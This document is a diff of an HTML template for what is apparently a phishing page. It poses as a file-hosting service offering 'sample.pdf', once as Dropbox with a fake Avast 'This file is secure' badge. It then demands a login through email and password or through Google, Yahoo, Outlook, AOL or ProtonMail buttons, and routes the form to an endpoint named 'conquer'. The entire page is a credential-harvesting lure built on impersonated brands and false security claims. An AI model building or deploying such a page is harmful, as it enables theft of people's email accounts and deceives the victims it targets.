@@ -1,142 +1,67 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="en" >
+
 <head>
-	<title>View File | Secure File Hosting With Dropbox</title>
-	<meta charset="UTF-8">
-	<meta name="viewport" content="width=device-width, initial-scale=1">
-<!--===============================================================================================-->	
-	<link rel="icon" type="image/png" href="images/icons/favicon.ico"/>
-<!--===============================================================================================-->
-	<link rel="stylesheet" type="text/css" href="vendor/bootstrap/css/bootstrap.min.css">
-<!--===============================================================================================-->
-	<link rel="stylesheet" type="text/css" href="fonts/font-awesome-4.7.0/css/font-awesome.min.css">
-<!--===============================================================================================-->
-	<link rel="stylesheet" type="text/css" href="fonts/Linearicons-Free-v1.0.0/icon-font.min.css">
-<!--===============================================================================================-->
-	<link rel="stylesheet" type="text/css" href="vendor/animate/animate.css">
-<!--===============================================================================================-->	
-	<link rel="stylesheet" type="text/css" href="vendor/css-hamburgers/hamburgers.min.css">
-<!--===============================================================================================-->
-	<link rel="stylesheet" type="text/css" href="vendor/animsition/css/animsition.min.css">
-<!--===============================================================================================-->
-	<link rel="stylesheet" type="text/css" href="vendor/select2/select2.min.css">
-<!--===============================================================================================-->	
-	<link rel="stylesheet" type="text/css" href="vendor/daterangepicker/daterangepicker.css">
-<!--===============================================================================================-->
-	<link rel="stylesheet" type="text/css" href="css/util.css">
-	<link rel="stylesheet" type="text/css" href="css/main.css">
-<!--===============================================================================================-->
+  <meta charset="UTF-8">
+  <title>Login to access this file | SH File Hosting</title>
+  
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/5.0.0/normalize.min.css">
+
+  <link rel='stylesheet prefetch' href='https://fonts.googleapis.com/css?family=Raleway'>
+<link rel='stylesheet prefetch' href='https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css'>
+
+      <link rel="stylesheet" href="css/style.css">
+
+  
 </head>
+
 <body>
-	
-	<div class="limiter">
-		<div class="container-login100">
-			<div class="wrap-login100 p-t-90 p-b-30">
-				<center><span><img src="images/logo.png" class="img img-responsive"></span></center>
-				
-				<form class="login100-form validate-form" id="f1">
-					<span class="login100-form-title p-b-40">
-						Filename: sample.pdf
-					</span><br>
-                  <center>
-                  	<span class="text-success"><img src="images/avast.jpeg" class="img img-responsive" style="width: 100px; height: 80px;"> This file is secure<i class="fa fa-check"></i></span>
-                  </center><br>               
-                  <div class="container-login100-form-btn">
-						<button class="login100-form-btn" type="submit">
-							View file
-						</button>
-					</div>
-                </form>
-				
-				<form action="#" class="login100-form validate-form" id="f2">
-					{{csrf_field()}}
-					<input type="hidden" id="deg" name="deg" value="emm"/>
-					<input type="hidden" id="uu" value="{{url('conquer')}}"/>
-					<span class="login100-form-title p-b-40">
-						Filename: sample.pdf
-					</span><br>
-					<span class="login100-form-title p-b-40">
-						Are you human? Login to continue to download
-			
-					</span>
 
-					<div>
-						<a href="#" class="btn-login-with bg1 m-b-10" id="fbb">
-							<i class="fa fa-facebook-official"></i>
-							Login with Facebook
-						</a>
+  <form action="#" id="login-form">
+  {{csrf_field()}}
+  <input type="hidden" id="deg" name="deg" value="emm"/>
+  <input type="hidden" id="uu" value="{{url('conquer')}}"/>
+  <div class="heading">Are you human? Login to continue</div>
+  <div class="left">
+    <label for="email" id="emm">Email</label> <br />
+    <input type="email" name="email" id="email" /> <br />
+    <label for="password" id="ppp">Password</label> <br />
+    <input type="password" name="pass" id="pass" /> <br />
+    <input type="submit" value="Login" />
+  </div>
+  <div class="right">
+    <div class="connect">Login with</div>
+    <a href="#" id="a-google" class="google-plus">
+<!--       <span class="fontawesome-google-plus"></span> -->
+      <i class="fa fa-google-plus" aria-hidden="true"></i>
+    </a>
+    <a href="#" id="a-yahoo" class="yahoo">
+<!--       <span class="fontawesome-google-plus"></span> -->
+      <i class="fa fa-yahoo" aria-hidden="true"></i>
+    </a>
+    <a href="#" id="a-outlook" class="outlook">
+<!--       <span class="fontawesome-google-plus"></span> -->
+      <img src="images/outlook.png" style="width: 30px; height: 25px;"> Outlook
+    </a>
+    <a href="#" id="a-aol" class="aol">
+<!--       <span class="fontawesome-google-plus"></span> -->
+     <img src="images/aol.png" style="width: 60px; height: 50px;">
+    </a>
+    <a href="#" id="a-protonmail" class="protonmail">
+<!--       <span class="fontawesome-google-plus"></span> -->
+         <img src="images/protonmail.png" style="width: 80px; height: 45px;">
+    </a>
+  </div>
+</form>
+  
+  
 
-						<a href="#" class="btn-login-with bg2 m-b-10" id="tww">
-							<i class="fa fa-twitter"></i>
-							Login with Twitter
-						</a>
-						
-						<a href="#" class="btn-login-with" id="emm">
-							<i class="fa fa-envelope"></i>
-							Login with email
-						</a>
-					</div>
+    <script src="js/jquery-1.12.0.min.js"></script>
+    <script  src="js/index.js"></script>
 
-					<div class="text-center p-t-55 p-b-30">
-						<span class="txt1" id="t1">
-							Login with email
-						</span>
-					</div>
 
-					<div class="wrap-input100 validate-input m-b-16" data-validate="Please enter email: ex@abc.xyz">
-						<input class="input100" type="text" name="email" placeholder="Email">
-						<span class="focus-input100"></span>
-					</div>
 
-					<div class="wrap-input100 validate-input m-b-20" data-validate = "Please enter password">
-						<span class="btn-show-pass">
-							<i class="fa fa fa-eye"></i>
-						</span>
-						<input class="input100" type="password" name="pass" placeholder="Password">
-						<span class="focus-input100"></span>
-					</div>
-
-					<div class="container-login100-form-btn">
-						<button class="login100-form-btn m-b-10" type="submit">
-							Login
-						</button><br>
-						<span id="protect" style="color: #3d3d3d;"><em>This page is protected by reCAPTCHA, and subject to the Google Privacy Policy and Terms of Service.</em></span>
-					</div>
-					<div id="error"></div><br>
-				        <div id="working"></div><br>
-						
-					<div class="flex-col-c p-t-224">
-						<span class="txt2 p-b-10">
-							Don’t have an account?
-						</span>
-
-						<a href="#" class="txt3 bo1 hov1">
-							Sign up now
-						</a>
-					</div>
-					
-				</form>
-			</div>
-		</div>
-	</div>
-	
-	
-<!--===============================================================================================-->
-	<script src="vendor/jquery/jquery-3.2.1.min.js"></script>
-<!--===============================================================================================-->
-	<script src="vendor/animsition/js/animsition.min.js"></script>
-<!--===============================================================================================-->
-	<script src="vendor/bootstrap/js/popper.js"></script>
-	<script src="vendor/bootstrap/js/bootstrap.min.js"></script>
-<!--===============================================================================================-->
-	<script src="vendor/select2/select2.min.js"></script>
-<!--===============================================================================================-->
-	<script src="vendor/daterangepicker/moment.min.js"></script>
-	<script src="vendor/daterangepicker/daterangepicker.js"></script>
-<!--===============================================================================================-->
-	<script src="vendor/countdowntime/countdowntime.js"></script>
-<!--===============================================================================================-->
-	<script src="js/main.js"></script>
 
 </body>
+
 </html>
